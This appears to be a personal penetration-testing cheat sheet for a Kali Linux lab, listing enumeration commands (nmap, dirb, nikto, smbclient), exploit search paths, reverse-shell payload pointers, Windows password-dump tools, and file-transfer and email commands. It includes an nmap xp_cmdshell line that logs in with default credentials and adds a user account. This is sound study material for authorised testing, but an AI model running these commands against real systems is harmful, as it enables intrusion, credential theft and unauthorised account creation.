# Kali command

## Special directory

Most of the resources can be found at /usr/share, include
* /usr/share/wordlist/rockyou.txt
* /usr/share/nmap/scirpts
* /usr/share/exploitdb/....
* /usr/share/windows-binaries

## enumeration

Scanning and time taken

* TCP 1000 port

* TCP all port

* UDP 1000 port
    nmap -sU -v 10.11.1.49
    Time taken 1 minutes

* UDP all port
    nmap -sU -v -p- 10.11.1.49
    Time taken

### nmap and scripts

nmap script are at /usr/share/nmap

Using nmap to find vulns

### website disovery tools

* dirb => dirb http://10.0.0.1

* nikto => nikto -h http://10.0.0.1

### smb discovery tools

* enum4linux

    * enum4linux 10.0.0.1

* smbclient

    * smbclient -L 10.0.0.1
    * smbclient //10.0.0.1/wwwroot -u ...

## Exploit searching

searchsploit and go to /usr/share/exploitdb

### Payload

Best php reverse shell: 
https://github.com/pentestmonkey/php-reverse-shell

### msfvenom

* php reverse shell

* python reverse shell

* war reverse shell

### Windows binaries

* password dump: fgdump => cachedump => pstgdump
* plink
* nc

## File transfer

* python -m SimpleHTTPServer 80

* python -m pyftpdlib -p 21 --write

## Transfer file using nc

Please aware of the version!! I encounter some nc doesnot support -e flag.


## Email

* sendEmail -t receiver@domain.local -f sender@domain.local -xu sender@domain.local -xp password -s 10.11.1.229 -u Urgent report -a ./report.pdf


## MSSQL

* https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html
```sh
nmap -p 445 --script ms-sql-discover,ms-sql-empty-password,ms-sql-xp-cmdshell <host>
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add" <host>
```



## Kali troubleshoot

sudo ifconfig eth0 up
sudo dhclient eth0 <- request smbd to turn on.
